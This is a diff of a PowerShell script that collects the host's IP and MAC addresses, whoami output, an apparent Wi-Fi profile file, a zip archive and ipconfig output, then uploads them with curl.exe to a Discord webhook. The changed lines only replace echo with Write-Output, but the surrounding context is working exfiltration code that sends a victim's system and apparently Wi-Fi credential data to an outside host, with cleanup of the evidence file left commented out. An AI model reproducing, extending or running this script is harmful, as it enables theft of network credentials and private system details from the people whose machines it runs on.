@@ -34,7 +34,7 @@ $ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 $info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ')"
 $content = "$($whoami_content) | $info | @everyone"
 
-echo about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
+Write-Output about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
 Start-Process curl.exe -ArgumentList @(
     '-X', 'POST',
     '-F', "content=$content",
@@ -43,7 +43,7 @@ Start-Process curl.exe -ArgumentList @(
     '-F', "file3=@$e\ipcfg.txt",
     $wh
 ) -Wait *> $null
-echo sent to discord
+Write-Output sent to discord
 # cleanup
 #cls
 #Remove-Item -Path "$wifiFile" -Force
